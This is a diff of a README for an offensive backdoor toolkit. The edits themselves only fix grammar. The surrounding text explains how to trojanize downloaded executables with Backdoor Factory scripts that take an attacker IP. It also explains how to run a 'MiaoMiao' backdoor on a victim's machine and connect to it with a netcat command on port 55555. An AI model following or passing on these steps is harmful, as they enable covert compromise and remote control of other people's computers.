@@ -62,14 +62,14 @@ python ./handler.py <IP_attacker>
 + Unicorn
 
 ## Backdoor-factory
-The backdoor-factory introduce the backdoor inside executables.
+The backdoor-factory introduces the backdoors inside executables.
 
 If you want to corrupt a executable, you just have to download the original, move it to the correct folder inside ./BDF_prepared and run python ./create_backdoors.py <IP_attacker> (or python ./backdoor-factoryAuto.py <IP_attacker>)
 
 https://github.com/secretsquirrel/the-backdoor-factory.git
 
 ## MiaoMiao
-This backdoor open a port in the victims machine and the attacker connects to it. The default port is 55555
+This backdoor opens a port in the victims machine and the attacker connects to it. The default port is 55555
 To use this backdoor you have to run:
 + Victim: Run MiaoMiamo_folder/src_backdoor/server_dist/newest_version
 + Attacker: nc IP_Victim 55555 -vv
